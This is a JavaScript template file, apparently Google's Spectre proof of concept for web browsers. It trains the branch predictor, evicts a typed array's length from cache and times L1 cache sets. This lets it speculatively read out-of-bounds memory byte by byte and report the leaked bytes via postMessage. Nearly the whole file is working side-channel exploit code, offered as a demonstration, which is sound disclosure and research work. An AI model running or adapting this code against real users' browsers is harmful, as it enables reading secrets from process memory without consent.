{#
Copyright 2021 Google LLC

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    https://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
#}

{% include 'setup_memory.js' %}

{% include 'constants.js' %}

{% include 'log.js' %}

{% include 'l1timer.js' %}

{% include 'leak_array_offset.js' %}

{% include 'eviction.js' %}

const ERR_MEM_LAYOUT = 0;
const ERR_U8_ALIGN = 1;
const ERR_NO_41 = 2;

function sleep(ms) {
  return new Promise(r=>setTimeout(r, ms));
}

function alignedArrayBuffer(sz) {
  const wasm_pages = Math.ceil(sz/(64*1024));
  return new WebAssembly.Memory({initial: wasm_pages, maximum: wasm_pages}).buffer
}

const probeArray = new Uint8Array(alignedArrayBuffer(PAGE_SZ));
probeArray[0] = 1;

const spectreArgs = new Uint32Array([0, 0, 0]);
function spectreGadget(trash) {
  // We want to access as little memory as possible to avoid false positives.
  // Putting arguments in a global array seems to work better than passing them
  // as parameters.
  const idx = spectreArgs[0]|0;
  const bit = spectreArgs[1]|0;
  const waaaaaat = spectreArgs[2]|0;

  // Add a loop to control the state of the branch predictor
  // I.e. we want the last n branches taken/not taken to be consistent
  for (let i = 0; i < {{ gadget_loop_reps }}; i++);

  // idx will be out of bounds during speculation
  // if the bit is zero, we access cache line 0 of the probe array otherwise
  // 0x800 (cache line 32)
  return probeArray[idx < spectreArray.length ? ((spectreArray[idx]>>bit)&1)*0x800 : 0x400];
}

function testBit(evictionList, offset, bit, bitValue, noopt = true) {
  spectreArgs[0] = 0;
  spectreArgs[1] = 0;

  // Run the gadget twice to train the branch predictor.
  for (let j = 0; j < {{ training_reps }}; j++) {
    spectreGadget();
  }

  // Try to evict the length field of our array from memory, so that we can
  // speculate over the length check.
  evictionList.traverse();

  spectreArgs[0] = offset;
  spectreArgs[1] = bit;

  // In the gadget, we access cacheSet 0 if the bit was 0 and set 32 for bit 1.
  const timing = spectreTimer.timeCacheSet(bitValue == 1 ? 32 : 0);

  if (timing > {{ cache_threshold }}) {
    return true;
  } else if (noopt) {
    return false;
  }

  // This is never reached, but the compiler doesn't know.
  // The gadget breaks if this function gets optimized. So we add garbage
  // instructions to blow up the byte code size and disable optimization.
  {{ noopt_code }}
}

function leakBit(evictionList, offset, bit) {
  let zeroes = 0;
  let ones = 0;

  // Our leak is probabilistic. To filter out some noise, we test both for bit 0
  // and 1 repeatedly. If we didn't get a difference in cache hits, continue
  // until we see a diff.
  for (let i = 0; i < {{ min_leak_reps }}; i++) {
    if (testBit(evictionList, offset, bit, 0)) zeroes++;
    if (testBit(evictionList, offset, bit, 1)) ones++;
  }
  for (let i = {{ min_leak_reps }}; ones == zeroes && i < {{ max_leak_reps }}; i++) {
    if (testBit(evictionList, offset, bit, 0)) zeroes++;
    if (testBit(evictionList, offset, bit, 1)) ones++;
    if (ones != zeroes) break;
  }
  return ones > zeroes ? 1 : 0;
}

function leakByte(evictionList, offset) {
  let byte = 0;
  for (let bit = 0; bit < 8; bit++) {
    byte |= leakBit(evictionList, offset, bit) << bit;
  }
  return byte;
}

function leakQword(evictionList, offset) {
  let qword = 0n;
  for (let i = 0; i < 8; i++) {
    qword |= BigInt(leakByte(evictionList, offset+i)) << BigInt(8*i);
  }
  return qword;
}

async function runSpectre() {
  const arrayPageOffset = (PAGE_SZ + inferredCacheSet*CACHE_LINE_SZ - alignedIndex*elementSize) % PAGE_SZ;
  log(`[*] array elements page offset: 0x${(arrayPageOffset).toString(16)}`);

  // We want the backing store ptr and the length of the typed array to be on separate cache lines.
  const desiredAlignment = 2*CACHE_LINE_SZ - ({{ backing_store_ptr_offset }});
  let typedArrayPageOffset = (arrayPageOffset + leakMe.length*4) % PAGE_SZ;
  log(`[*] first typedArray at 0x${typedArrayPageOffset.toString(16)}`);

  // We prepared a memory layout in setup_memory.js that looks like this:
  // leakMe | typedArray[0] | typedArrayBackingStore[0] | typedArray[1] | typedArrayBackingStore[1] | ...
  // Just iterate through them to find one that has the alignment we want.
  let alignedTypedArray = undefined;
  for (let i = 0; i < typedArrays.length-1; i++) {
    if (typedArrayPageOffset % (2*CACHE_LINE_SZ) == desiredAlignment) {
      log(`[*] found typedArray with desired alignment (@0x${typedArrayPageOffset.toString(16)})`);
      alignedTypedArray = typedArrays[i];
      alignedTypedArray.fill(0x00);
      const targetArray = typedArrays[i+1];
      // Fill all arrays before and after with 0x41 so that we can see them in
      // the hexdump.
      // We also use it as a known value to test if our leak works.
      for (let j = 0; j < i; j++) {
        typedArrays[j].fill(0x41);
      }
      for (let j = i+1; j < typedArrays.length; j++) {
        typedArrays[j].fill(0x41);
      }
      break;
    }
    typedArrayPageOffset += {{ typed_array_offset }};
    typedArrayPageOffset %= PAGE_SZ;
  }
  if (alignedTypedArray == undefined) {
    err(ERR_U8_ALIGN, "couldn't create typed array with right alignment");
    return;
  }

  // Create these as globals.
  // The spectreArray is what we will access out of bounds.
  // The spectreTimer calls the spectre gadget and checks which cache sets it's using.
  Object.defineProperty(this, "spectreArray", {
      value: alignedTypedArray
  });
  Object.defineProperty(this, "spectreTimer", {
      value: new L1Timer(spectreGadget)
  });

  const cacheLineToFlush = typedArrayPageOffset & 0xfc0;
  // This will be used to evict the typed array length from the cache
  const evictionList = new EvictionList({{ eviction_list_size }}, cacheLineToFlush);

  // Test that the leak is working. We previously wrote byte 0x41 at a known offset.
  const leakTestReps = {{ leak_test_reps }};
  let falsePositives = 0;
  let falseNegatives = leakTestReps;
  for (let i = 0; i < leakTestReps; i++) {
    // The expected value is 0x41
    falseNegatives -= leakBit(evictionList, {{ backing_store_offset }}, 0);
    falsePositives += leakBit(evictionList, {{ backing_store_offset }}, 1);
  }
  const falsePositivePercent = Math.floor(100*falsePositives/leakTestReps);
  const falseNegativePercent = Math.floor(100*falseNegatives/leakTestReps);
  log(`[*] false positives: ${falsePositivePercent}%, false negatives: ${falseNegativePercent}%`);

  if (falsePositivePercent > {{ accepted_false_positive_percent }}) {
    err(ERR_NO_41, 'too many wrong false positives in leak test (> {{ accepted_false_positive_percent }}%)');
    return;
  }
  if (falseNegativePercent > {{ accepted_false_negative_percent }}) {
    err(ERR_NO_41, 'too many wrong false negatives in leak test (> {{ accepted_false_negative_percent }}%)');
    return;
  }

  log('[*] setup complete, start leaking');
  await sleep(50);

  const leakCount = {{ leak_count }};
  const reportSize = {{ report_size }};
  let leaked = [];

  let time = performance.now();
  for (let leakOffset = 0; leakOffset < leakCount; leakOffset++) {
    if (leaked.length == reportSize) {
      postMessage({type: 'memory', mem: leaked, offset: leakOffset - leaked.length, time: performance.now() - time});
      await sleep(10);
      leaked = [];
      time = performance.now()
    }
    leaked.push(leakByte(evictionList, leakOffset));
  }
  if (leaked.length > 0) {
    postMessage({type: 'memory', mem: leaked, offset: leakCount - leaked.length, time: performance.now() - time});
  }

  log('[*] done');
}

if (leakSuccess) {
  log(`[*] inferred memory layout: array index ${alignedIndex} is in cacheSet ${inferredCacheSet}`);

  // To verify, you can search for the value 0x26700000266e in a debugger
  leakMe[alignedIndex] = 0x1337;
  leakMe[alignedIndex+1] = 0x1338;

  runSpectre();
} else {
  err(ERR_MEM_LAYOUT, "could not infer memory layout", {cacheHits: cacheHits});
}
